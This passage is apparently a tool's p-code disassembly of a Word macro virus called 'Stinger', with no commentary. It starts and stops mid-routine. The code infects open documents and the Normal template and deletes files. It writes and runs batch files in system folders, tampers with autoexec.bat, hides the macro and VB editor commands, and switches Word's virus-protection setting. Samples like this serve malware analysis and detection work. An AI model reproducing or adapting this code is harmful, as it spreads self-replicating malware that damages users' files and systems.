' 	Paren 
' 	Ld Timer 
' 	LitDI4 0xA8C0 0x0000 
' 	Ge 
' 	Paren 
' 	Ld Timer 
' 	LitDI4 0xB6D0 0x0000 
' 	Le 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Timer 
' 	LitDI4 0x0B30 0x0001 
' 	Ge 
' 	Paren 
' 	Ld Timer 
' 	LitDI4 0x2750 0x0001 
' 	Le 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #135:
' 	LitVarSpecial (True)
' 	St ChngOptn 
' Line #136:
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	ElseIfBlock 
' Line #137:
' 	LitVarSpecial (True)
' 	St ChngOptn 
' Line #138:
' 	ElseBlock 
' Line #139:
' 	LitVarSpecial (False)
' 	St ChngOptn 
' Line #140:
' 	EndIfBlock 
' Line #141:
' 	ElseBlock 
' Line #142:
' 	LitVarSpecial (False)
' 	St ChngOptn 
' Line #143:
' 	EndIfBlock 
' Line #144:
' Line #145:
' 	Ld mDaysOld 
' 	LitDI2 0x001E 
' 	Lt 
' 	IfBlock 
' Line #146:
' 	LitVarSpecial (False)
' 	St ChngOptn 
' Line #147:
' 	EndIfBlock 
' Line #148:
' Line #149:
' 	Ld PrintCd 
' 	LitStr 0x0002 "FP"
' 	Eq 
' 	IfBlock 
' Line #150:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #151:
' 	ElseBlock 
' Line #152:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #153:
' 	EndIfBlock 
' Line #154:
' Line #155:
' 	Ld ChngOptn 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #156:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #157:
' 	LitVarSpecial (True)
' 	MemStWith PrintDraft 
' Line #158:
' 	LitVarSpecial (True)
' 	MemStWith PrintFieldCodes 
' Line #159:
' 	LitVarSpecial (True)
' 	MemStWith PrintHiddenText 
' Line #160:
' 	LitVarSpecial (False)
' 	MemStWith PrintDrawingObjects 
' Line #161:
' 	EndWith 
' Line #162:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #163:
' 	LitVarSpecial (True)
' 	MemStWith PrintFormsData 
' Line #164:
' 	EndWith 
' Line #165:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #166:
' 	LitVarSpecial (False)
' 	Ld wdUsePrinterMetrics 
' 	ArgsMemStWith Compatibility 0x0001 
' Line #167:
' 	LitVarSpecial (False)
' 	Ld wdWW6BorderRules 
' 	ArgsMemStWith Compatibility 0x0001 
' Line #168:
' 	EndWith 
' Line #169:
' 	EndIfBlock 
' Line #170:
' Line #171:
' 	EndFunc 
' Line #172:
' Line #173:
' 	FuncDefn (Sub FileOpen())
' Line #174:
' Line #175:
' 	LitDI2 0x0000 
' 	St mDiagReply 
' Line #176:
' Line #177:
' 	OnError (Resume Next) 
' Line #178:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	St mDiagReply 
' Line #179:
' 	OnError (GoTo 0) 
' Line #180:
' Line #181:
' 	Ld mDiagReply 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	IfBlock 
' Line #182:
' Line #183:
' 	Ld ActiveDocument 
' 	LitStr 0x0007 "Stinger"
' 	ArgsCall (Call) RemvMac 0x0002 
' Line #184:
' Line #185:
' 	LitStr 0x0009 "Projéct12"
' 	St mPrjNm 
' Line #186:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	St xPrjNm 
' Line #187:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St xFulNm 
' Line #188:
' Line #189:
' 	Ld xPrjNm 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "Projéct"
' 	Eq 
' 	IfBlock 
' Line #190:
' 	Ld xPrjNm 
' 	Ld mPrjNm 
' 	Lt 
' 	IfBlock 
' Line #191:
' 	Ld ActiveDocument 
' 	ArgsCall (Call) InfctDcmnt 0x0001 
' Line #192:
' 	Ld xFulNm 
' 	ParamNamed FileName 
' 	Ld wdOpenFormatAuto 
' 	ParamNamed Format$ 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0002 
' Line #193:
' 	EndIfBlock 
' Line #194:
' 	EndIfBlock 
' Line #195:
' Line #196:
' 	EndIfBlock 
' Line #197:
' Line #198:
' 	EndSub 
' Line #199:
' Line #200:
' 	FuncDefn (Sub DocClose())
' Line #201:
' 	Ld ActiveDocument 
' 	ArgsCall (Call) CloseFile 0x0001 
' Line #202:
' 	EndSub 
' Line #203:
' Line #204:
' 	FuncDefn (Sub FileClose())
' Line #205:
' 	Ld ActiveDocument 
' 	ArgsCall (Call) CloseFile 0x0001 
' Line #206:
' 	EndSub 
' Line #207:
' Line #208:
' 	FuncDefn (Function CloseFile(mDcNm7))
' Line #209:
' Line #210:
' 	Ld mDcNm7 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #211:
' Line #212:
' 	LitStr 0x0006 "Closed"
' 	St CloseFile 
' Line #213:
' 	LitStr 0x0009 "Projéct12"
' 	St mPrjNm 
' Line #214:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	St nPrjNm 
' Line #215:
' Line #216:
' 	LineCont 0x0004 0E 00 04 00
' 	Ld mDcNm7 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Eq 
' 	Paren 
' 	Ld mDcNm7 
' 	MemLd Characters 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #217:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #218:
' 	ExitFunc 
' Line #219:
' 	EndIfBlock 
' Line #220:
' Line #221:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #222:
' 	LitStr 0x002D "Do you want to save the changes you made to '"
' 	Ld mDcNm7 
' 	MemLd New 
' 	Concat 
' 	LitStr 0x0002 "'?"
' 	Concat 
' 	St mMsg 
' Line #223:
' 	Ld vbYesNoCancel 
' 	Ld vbExclamation 
' 	Add 
' 	Ld vbDefaultButton1 
' 	Add 
' 	St mStyle 
' Line #224:
' 	LitStr 0x000E "Microsoft Word"
' 	St mTitle 
' Line #225:
' 	ArgsCall Beep 0x0000 
' Line #226:
' 	Ld mMsg 
' 	Ld mStyle 
' 	Ld mTitle 
' 	ArgsLd MsgBox 0x0003 
' 	St mResponse 
' Line #227:
' 	Ld mResponse 
' 	SelectCase 
' Line #228:
' 	Ld vbYes 
' 	Case 
' 	CaseDone 
' Line #229:
' 	Ld mDcNm7 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #230:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	St mDiagReply 
' Line #231:
' 	Ld mDiagReply 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #232:
' 	LitStr 0x0008 "Canceled"
' 	St CloseFile 
' Line #233:
' 	ExitFunc 
' Line #234:
' 	EndIfBlock 
' Line #235:
' 	ElseBlock 
' Line #236:
' 	OnError ExtClsFl 
' Line #237:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #238:
' 	OnError (GoTo 0) 
' Line #239:
' 	EndIfBlock 
' Line #240:
' 	Ld vbNo 
' 	Case 
' 	CaseDone 
' Line #241:
' 	Ld mDcNm7 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #242:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #243:
' 	ExitFunc 
' Line #244:
' 	EndIfBlock 
' Line #245:
' 	CaseElse 
' Line #246:
' 	LitStr 0x0008 "Canceled"
' 	St CloseFile 
' Line #247:
' 	ExitFunc 
' Line #248:
' 	EndSelect 
' Line #249:
' 	EndIfBlock 
' Line #250:
' Line #251:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	Ld mPrjNm 
' 	Ne 
' 	IfBlock 
' Line #252:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	And 
' 	St RO_Chk 
' Line #253:
' 	Ld RO_Chk 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #254:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #255:
' 	ElseBlock 
' Line #256:
' 	Ld ActiveDocument 
' 	ArgsCall (Call) InfctDcmnt 0x0001 
' Line #257:
' 	EndIfBlock 
' Line #258:
' 	ExitFunc 
' Line #259:
' 	EndIfBlock 
' Line #260:
' Line #261:
' 	LineCont 0x0004 05 00 04 00
' 	LitStr 0x001E "C:\WINDOWS\COMMAND\SYSTEM1.DT_"
' 	Ld vbHidden 
' 	Ld vbReadOnly 
' 	Add 
' 	Ld vbSystem 
' 	Add 
' 	Ld vbArchive 
' 	Add 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #262:
' 	Ld ActiveDocument 
' 	ArgsCall (Call) InfctSystm 0x0001 
' Line #263:
' 	ElseBlock 
' Line #264:
' 	Ld nPrjNm 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "Projéct"
' 	Eq 
' 	IfBlock 
' Line #265:
' 	Ld nPrjNm 
' 	Ld mPrjNm 
' 	Lt 
' 	IfBlock 
' Line #266:
' 	Ld ActiveDocument 
' 	ArgsCall (Call) InfctSystm 0x0001 
' Line #267:
' 	EndIfBlock 
' Line #268:
' 	EndIfBlock 
' Line #269:
' 	EndIfBlock 
' Line #270:
' Line #271:
' 	OnError (Resume Next) 
' Line #272:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #273:
' 	OnError (GoTo 0) 
' Line #274:
' 	ExitFunc 
' Line #275:
' Line #276:
' 	Label ExtClsFl 
' Line #277:
' Line #278:
' 	LitStr 0x0008 "Canceled"
' 	St CloseFile 
' Line #279:
' 	OnError (GoTo 0) 
' Line #280:
' Line #281:
' 	EndFunc 
' Line #282:
' Line #283:
' 	FuncDefn (Function InfctDcmnt(mDcNm8))
' Line #284:
' Line #285:
' 	Ld mDcNm8 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #286:
' Line #287:
' 	Ld mDcNm8 
' 	MemLd New 
' 	ArgsLd mDOSNm 0x0001 
' 	St mDocName 
' Line #288:
' 	LitStr 0x0010 "C:\WINDOWS\TEMP\"
' 	Ld mDocName 
' 	Concat 
' 	St mTempFl 
' Line #289:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St mOrgFile 
' Line #290:
' Line #291:
' 	Ld mDocName 
' 	ArgsLd ExtractFl 0x0001 
' 	St mExtReslt 
' Line #292:
' Line #293:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd Range 
' 	Set myRange 
' Line #294:
' 	Ld myRange 
' 	ArgsMemCall WholeStory 0x0000 
' Line #295:
' 	Ld myRange 
' 	ArgsMemCall Copy 0x0000 
' Line #296:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #297:
' Line #298:
' 	OnError ExtInfctDcmnt 
' Line #299:
' Line #300:
' 	LineCont 0x000C 0B 00 04 00 17 00 04 00 23 00 04 00
' 	Ld mTempFl 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordTemplate 
' 	LitVarSpecial (False)
' 	ParamNamed Revert 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordDocument 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordTemplate 
' 	Ld wdOpenFormatAuto 
' 	ParamNamed Format$ 
' 	Ld Documents 
' 	ArgsMemCall Option 0x000A 
' Line #301:
' Line #302:
' 	OnError (GoTo 0) 
' Line #303:
' Line #304:
' 	Ld Selection 
' 	ArgsMemCall Paste 0x0000 
' Line #305:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #306:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #307:
' Line #308:
' 	OnError (Resume Next) 
' Line #309:
' 	Ld mOrgFile 
' 	ArgsCall Kill 0x0001 
' Line #310:
' 	OnError (Resume Next) 
' Line #311:
' 	Ld mTempFl 
' 	Ld mOrgFile 
' 	ArgsCall FileCopy 0x0002 
' Line #312:
' Line #313:
' 	Label ExtInfctDcmnt 
' Line #314:
' Line #315:
' 	OnError (Resume Next) 
' Line #316:
' 	Ld mTempFl 
' 	ArgsCall Kill 0x0001 
' Line #317:
' 	OnError (GoTo 0) 
' Line #318:
' Line #319:
' 	EndFunc 
' Line #320:
' Line #321:
' 	FuncDefn (Function InfctSystm(mDcNm9))
' Line #322:
' Line #323:
' 	Ld mDcNm9 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #324:
' Line #325:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St mTmpNm 
' Line #326:
' 	LitStr 0x0010 "C:\WINDOWS\TEMP\"
' 	Ld mTmpNm 
' 	Concat 
' 	St mFile1 
' Line #327:
' 	LitStr 0x0013 "C:\WINDOWS\COMMAND\"
' 	Ld mTmpNm 
' 	Concat 
' 	St mFile2 
' Line #328:
' 	LitStr 0x000B "C:\WINDOWS\"
' 	Ld mTmpNm 
' 	Concat 
' 	St mFile3 
' Line #329:
' 	LitStr 0x000B "C:\WINDOWS\"
' 	Ld mDcNm9 
' 	MemLd New 
' 	ArgsLd mDOSNm 0x0001 
' 	Concat 
' 	St mFl3DOSNm 
' Line #330:
' 	LitStr 0x001E "C:\WINDOWS\COMMAND\SYSTEM1.DT_"
' 	St mFile4 
' Line #331:
' 	LitStr 0x001E "C:\WINDOWS\COMMAND\SYSTEM2.DT_"
' 	St mFile5 
' Line #332:
' Line #333:
' 	ArgsCall (Call) SvTmpPath 0x0000 
' Line #334:
' Line #335:
' 	LineCont 0x0004 09 00 08 00
' 	LitStr 0x002B "C:\Program Files\Microsoft Office\Templates"
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #336:
' Line #337:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd Range 
' 	Set mRange 
' Line #338:
' 	Ld mRange 
' 	ArgsMemCall WholeStory 0x0000 
' Line #339:
' 	Ld mRange 
' 	ArgsMemCall Delete 0x0000 
' Line #340:
' Line #341:
' 	LineCont 0x0004 0B 00 04 00
' 	Ld mFile1 
' 	ParamNamed FileName 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #342:
' Line #343:
' 	LineCont 0x0004 07 00 04 00
' 	Ld mFile2 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0003 
' Line #344:
' Line #345:
' 	Ld mFile3 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #346:
' Line #347:
' 	OnError (Resume Next) 
' Line #348:
' 	Ld mFile4 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #349:
' 	Ld mFile4 
' 	ArgsCall Kill 0x0001 
' Line #350:
' 	OnError (GoTo 0) 
' Line #351:
' Line #352:
' 	Ld mFile1 
' 	Ld mFile5 
' 	Name 
' Line #353:
' 	Ld mFile2 
' 	Ld mFile4 
' 	Name 
' Line #354:
' Line #355:
' 	ArgsCall (Call) ChkFiles 0x0000 
' Line #356:
' Line #357:
' 	LitStr 0x0019 "C:\WINDOWS\COMMAND\ZZ.BAT"
' 	St FNStrngX$ 
' Line #358:
' 	Ld Friend 
' 	St hNmbr 
' Line #359:
' Line #360:
' 	Ld FNStrngX$ 
' 	Ld hNmbr 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #361:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@ECHO OFF"
' 	PrintItemNL 
' Line #362:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 ":START"
' 	PrintItemNL 
' Line #363:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "CLS"
' 	PrintItemNL 
' Line #364:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "IF EXIST "
' 	Ld mFl3DOSNm 
' 	Concat 
' 	LitStr 0x0005 " DEL "
' 	Concat 
' 	Ld mFl3DOSNm 
' 	Concat 
' 	PrintItemNL 
' Line #365:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "IF EXIST "
' 	Ld mFl3DOSNm 
' 	Concat 
' 	LitStr 0x000B " GOTO START"
' 	Concat 
' 	PrintItemNL 
' Line #366:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "CLS"
' 	PrintItemNL 
' Line #367:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "DEL "
' 	Ld FNStrngX$ 
' 	Concat 
' 	PrintItemNL 
' Line #368:
' 	Ld hNmbr 
' 	Sharp 
' 	Close 0x0001 
' Line #369:
' Line #370:
' 	Ld FNStrngX$ 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St mResult 
' Line #371:
' Line #372:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #373:
' Line #374:
' 	EndFunc 
' Line #375:
' Line #376:
' 	FuncDefn (Sub ToolsMacro())
' Line #377:
' 	EndSub 
' Line #378:
' Line #379:
' 	FuncDefn (Sub ToolsCustomize())
' Line #380:
' 	EndSub 
' Line #381:
' Line #382:
' 	FuncDefn (Sub ToolsOptions())
' Line #383:
' Line #384:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #385:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #386:
' Line #387:
' 	ArgsLd RdTmpPath 0x0000 
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #388:
' Line #389:
' 	OnError (Resume Next) 
' Line #390:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #391:
' 	OnError (GoTo 0) 
' Line #392:
' Line #393:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #394:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #395:
' Line #396:
' 	ArgsCall (Call) SvTmpPath 0x0000 
' Line #397:
' Line #398:
' 	LineCont 0x0004 09 00 08 00
' 	LitStr 0x002B "C:\Program Files\Microsoft Office\Templates"
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #399:
' Line #400:
' 	EndSub 
' Line #401:
' Line #402:
' 	FuncDefn (Sub ViewVbCode())
' Line #403:
' 	EndSub 
' Line #404:
' Line #405:
' 	FuncDefn (Function RemvMac(DcNm2, McNm2))
' Line #406:
' Line #407:
' 	Ld DcNm2 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	St DcNm2Prtctn 
' Line #408:
' 	LitVarSpecial (False)
' 	St RemvMac 
' Line #409:
' Line #410:
' 	Ld DcNm2Prtctn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #411:
' 	StartForVariable 
' 	Ld DcNm2j 
' 	EndForVariable 
' 	Ld DcNm2 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #412:
' 	Ld DcNm2j 
' 	Ld DcNm2 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St DcNm2ProcNm 
' Line #413:
' 	LineCont 0x0008 07 00 0C 00 0D 00 0C 00
' 	Ld DcNm2ProcNm 
' 	Ld McNm2 
' 	Ne 
' 	Paren 
' 	Ld DcNm2ProcNm 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld DcNm2ProcNm 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #414:
' 	LineCont 0x0004 09 00 10 00
' 	Ld DcNm2 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld DcNm2ProcNm 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #415:
' 	LitVarSpecial (True)
' 	St RemvMac 
' Line #416:
' 	EndIfBlock 
' Line #417:
' 	StartForVariable 
' 	Ld DcNm2j 
' 	EndForVariable 
' 	NextVar 
' Line #418:
' 	EndIfBlock 
' Line #419:
' Line #420:
' 	EndFunc 
' Line #421:
' Line #422:
' 	FuncDefn (Sub ChkFiles())
' Line #423:
' Line #424:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	St FNStrng1$ 
' Line #425:
' 	LitStr 0x0019 "C:\WINDOWS\COMMAND\AZ.bat"
' 	St FNStrng2$ 
' Line #426:
' 	LitStr 0x0019 "C:\WINDOWS\COMMAND\XZ.bat"
' 	St FNStrng3$ 
' Line #427:
' 	LitStr 0x0015 "C:\WINDOWS\TEMP\*.DO?"
' 	St FNStrng4$ 
' Line #428:
' Line #429:
' 	OnError (Resume Next) 
' Line #430:
' Line #431:
' 	Ld FNStrng2$ 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #432:
' 	Ld FNStrng3$ 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #433:
' 	Ld FNStrng4$ 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #434:
' Line #435:
' 	Ld FNStrng2$ 
' 	ArgsCall Kill 0x0001 
' Line #436:
' 	Ld FNStrng3$ 
' 	ArgsCall Kill 0x0001 
' Line #437:
' 	Ld FNStrng4$ 
' 	ArgsCall Kill 0x0001 
' Line #438:
' Line #439:
' 	OnError (GoTo 0) 
' Line #440:
' Line #441:
' 	ArgsCall (Call) MkLoadrFl 0x0000 
' Line #442:
' 	ArgsCall (Call) MkHsKprFl 0x0000 
' Line #443:
' Line #444:
' 	Ld FNStrng3$ 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St mResult 
' Line #445:
' 	LitStr 0x001C "C:\WINDOWS\TEMP\~_110499.TMP"
' 	St FNStrngW$ 
' Line #446:
' Line #447:
' 	Ld FNStrngW$ 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #448:
' 	Loop 
' Line #449:
' Line #450:
' 	OnError ResumeKill2 
' Line #451:
' 	Ld FNStrngW$ 
' 	ArgsCall Kill 0x0001 
' Line #452:
' 	Ld FNStrng3$ 
' 	ArgsCall Kill 0x0001 
' Line #453:
' 	OnError (GoTo 0) 
' Line #454:
' Line #455:
' 	Ld Friend 
' 	St hNmbr 
' Line #456:
' 	Dim 
' 	VarDefn InputData
' 	VarDefn ShowLine
' Line #457:
' Line #458:
' 	OnError CreateFl 
' Line #459:
' Line #460:
' 	Ld FNStrng1$ 
' 	Ld hNmbr 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #461:
' Line #462:
' 	LitDI2 0x00FF 
' 	ArgsLd Chr 0x0001 
' 	St FileMarker 
' Line #463:
' 	LitVarSpecial (False)
' 	St MarkerFound 
' Line #464:
' Line #465:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #466:
' 	Ld hNmbr 
' 	Ld InputData 
' 	LineInput 
' Line #467:
' 	Ld InputData 
' 	Ld FileMarker 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St MarkerFound 
' 	EndIf 
' Line #468:
' 	Loop 
' Line #469:
' Line #470:
' 	Ld hNmbr 
' 	Sharp 
' 	Close 0x0001 
' Line #471:
' Line #472:
' 	Ld MarkerFound 
' 	LitVarSpecial (True)
' 	Ne 
' 	IfBlock 
' Line #473:
' 	Ld Friend 
' 	St hNmbr 
' Line #474:
' 	Ld FNStrng1$ 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #475:
' 	Ld FNStrng1$ 
' 	Ld hNmbr 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #476:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	Ld FileMarker 
' 	PrintItemNL 
' Line #477:
' 	Ld hNmbr 
' 	Sharp 
' 	Close 0x0001 
' Line #478:
' 	EndIfBlock 
' Line #479:
' Line #480:
' 	OnError (GoTo 0) 
' Line #481:
' Line #482:
' 	ExitSub 
' Line #483:
' Line #484:
' 	Label CreateFl 
' Line #485:
' Line #486:
' 	ArgsCall (Call) MkAutoFl 0x0000 
' Line #487:
' 	Ld FNStrng1$ 
' 	Ld vbHidden 
' 	ArgsCall SetAttr 0x0002 
' Line #488:
' 	OnError (GoTo 0) 
' Line #489:
' 	ExitSub 
' Line #490:
' Line #491:
' 	Label ResumeKill2 
' Line #492:
' 	Resume  
' Line #493:
' Line #494:
' 	EndSub 
' Line #495:
' Line #496:
' 	FuncDefn (Function CdRegistry())
' Line #497:
' Line #498:
' 	Dim 
' 	VarDefn mEnvString
' 	VarDefn mIndx
' 	VarDefn mMsg
' 	VarDefn mPathLen
' Line #499:
' 	LitDI2 0x0001 
' 	St mIndx 
' Line #500:
' 	LitStr 0x0007 "WIN_VER"
' 	St mSrchStrng 
' Line #501:
' 	Ld mSrchStrng 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Add 
' 	St mSSLength 
' Line #502:
' Line #503:
' 	LitStr 0x0000 ""
' 	St CdRegistry 
' Line #504:
' Line #505:
' 	Do 
' Line #506:
' 	Ld mIndx 
' 	ArgsLd Environ 0x0001 
' 	St mEnvString 
' Line #507:
' 	Ld mEnvString 
' 	Ld mSSLength 
' 	ArgsLd LBound 0x0002 
' 	Ld mSrchStrng 
' 	LitStr 0x0001 "="
' 	Concat 
' 	Paren 
' 	Eq 
' 	IfBlock 
' Line #508:
' 	Ld mSrchStrng 
' 	ArgsLd Environ 0x0001 
' 	St CdRegistry 
' Line #509:
' 	ExitDo 
' Line #510:
' 	ElseBlock 
' Line #511:
' 	Ld mIndx 
' 	LitDI2 0x0001 
' 	Add 
' 	St mIndx 
' Line #512:
' 	EndIfBlock 
' Line #513:
' 	Ld mEnvString 
' 	LitStr 0x0000 ""
' 	Eq 
' 	LoopUntil 
' Line #514:
' Line #515:
' 	EndFunc 
' Line #516:
' Line #517:
' 	FuncDefn (Function ExtractFl(mXtNm))
' Line #518:
' Line #519:
' 	LitStr 0x0010 "C:\WINDOWS\TEMP\"
' 	Ld mXtNm 
' 	Concat 
' 	St mFlTmp 
' Line #520:
' 	LitStr 0x0019 "C:\WINDOWS\TEMP\CpyFl.Bat"
' 	St FNStrngX$ 
' Line #521:
' 	LitStr 0x001C "C:\WINDOWS\TEMP\~_110499.TMP"
' 	St FNStrngW$ 
' Line #522:
' Line #523:
' 	Ld Friend 
' 	St hNmbr 
' Line #524:
' Line #525:
' 	Ld FNStrngX$ 
' 	Ld hNmbr 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #526:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@ECHO OFF"
' 	PrintItemNL 
' Line #527:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "DEL "
' 	Ld FNStrngW$ 
' 	Concat 
' 	PrintItemNL 
' Line #528:
' 	Ld hNmbr 
